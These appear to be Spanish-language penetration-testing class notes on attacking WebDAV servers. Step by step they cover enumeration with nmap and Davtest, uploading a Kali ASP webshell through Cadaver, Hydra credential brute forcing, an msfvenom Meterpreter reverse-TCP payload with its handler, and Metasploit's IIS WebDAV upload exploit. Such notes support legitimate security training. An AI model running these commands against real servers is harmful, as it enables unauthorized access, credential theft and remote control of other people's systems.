# WebDAV

* **WebDav**: [https://hub.docker.com/r/bytemark/webdav](https://hub.docker.com/r/bytemark/webdav)



### Que es webDav

**WebDAV** (**Web Distributed Authoring and Versioning**) es una extensión del protocolo HTTP que permite a los usuarios **acceder** y **manipular** **archivos** en un servidor web a través de una conexión segura

Cuando hablamos de enumerar un servidor WebDAV, a lo que nos referimos es al proceso de recopilar información sobre los recursos disponibles en el servidor WebDAV. Los atacantes pueden utilizar herramientas de enumeración de WebDAV para buscar recursos protegidos en el servidor, como archivos de configuración, contraseñas y otros datos confidenciales. Los atacantes pueden utilizar la información recopilada durante la enumeración para planificar ataques más sofisticados contra el servidor.

para identificarlo más a fondo podemos usar&#x20;

```
nmap -sV --script= http-enum <ip>
```

### Davtest

Una de las herramientas que vemos en esta clase es **Davtest**. La herramienta Davtest es una herramienta de línea de comandos que se utiliza para realizar pruebas de penetración en servidores WebDAV. Davtest puede utilizarse para enumerar recursos protegidos en un servidor WebDAV, así como para probar la configuración de seguridad del servidor. Davtest también puede utilizarse para probar la autenticación y la autorización del servidor, y para detectar vulnerabilidades conocidas.

<figure><img src="../../.gitbook/assets/Pasted image 20251009131915.png" alt=""><figcaption></figcaption></figure>

```
davtest -url http://<ip>/raiz/davweb
```

```
davtest -auth <usuario>:<contraseña> -url <urlWebdav>
```

si nos da login correcto, subirá multiples archivos al webDav y cual son ejecutables. Una vez que vemos que archivos podemos usar la herramienta de Cadaver para subir el archivo y obtener una reverse shell

### Cadaver

Otra de las herramientas que vemos en esta clase es **Cadaver**. Cadaver es otra herramienta de línea de comandos que se utiliza para interactuar con servidores WebDAV. Cadaver permite a los usuarios navegar por los recursos del servidor, cargar y descargar archivos, y ejecutar comandos en el servidor. Cadaver también puede utilizarse para realizar pruebas de penetración en servidores WebDAV, como la enumeración de recursos protegidos y la explotación de vulnerabilidades conocidas.

```
cadaver http:/<ip>/directorioWebDav 
```

una vez que nos hemos logueado podemos ir a la siguiente carpeta de kali, la cual contiene webshells

```
ls -la /usr/share/webshells
```

y luego podemos hacer el comando put de la webshells que antes hemos visto que se va a ejecutar con webtest

```
put /usr/share/webshells/asp/webshell.asp
```

esto nos dara una consola interactiva en la web&#x20;

### Fuerza bruta con hydra

```
hydra -L /usr/share/wordlists/metasploit/common_user.txt -P /usr/share/wordlists/metasploit/common_password.txt <ip> http-get /webdav/
```

### Ataque con metasploit

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST <ip> LPORT <puerto> -f <tipo de archivo> > <nombre del archvo>
use multi/handler
set payload windows/meterpreter/reverse_tcp ##debe ser el mismo payload que hemos configurado con msfvenom
    set rhosts <ip>
    set LHOST <ip> ##debe ser el mismo que hemos especificado con msfvenom
    set LPORT <puerto> ##debe ser el mismo que hemos especificado con msfvenom
```

```bash
search iis upload
use exploit/windows/iis/iis_webdav_upload_asp
set httpusername <username>
set httppassword <password>
set rhosts <ip>
set PATH /<webdav>/metasploit.asp
```
